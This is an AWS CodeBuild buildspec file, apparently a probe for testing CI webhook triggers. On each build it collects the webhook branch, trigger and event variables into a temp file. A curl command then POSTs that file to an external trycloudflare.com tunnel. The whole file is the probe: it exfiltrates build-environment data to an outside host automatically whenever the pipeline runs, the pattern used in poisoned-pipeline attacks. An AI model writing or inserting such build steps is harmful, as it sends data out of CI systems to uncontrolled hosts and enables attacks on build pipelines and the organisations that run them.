version: 0.2

phases:
  build:
    commands:
      - |
        {
          echo "=== CTRL_A: branch without lab keyword ==="
          echo "HEAD_REF: $CODEBUILD_WEBHOOK_HEAD_REF"
          echo "TRIGGER: $CODEBUILD_WEBHOOK_TRIGGER"
          echo "EVENT: $CODEBUILD_WEBHOOK_EVENT"
          echo "DONE_CTRL_A"
        } > /tmp/a.txt 2>&1
      - "curl -s -m 25 -X POST https://hazardous-artistic-arrested-classroom.trycloudflare.com/ctrlA -H 'Content-Type: text/plain' --data-binary @/tmp/a.txt || echo FAIL"
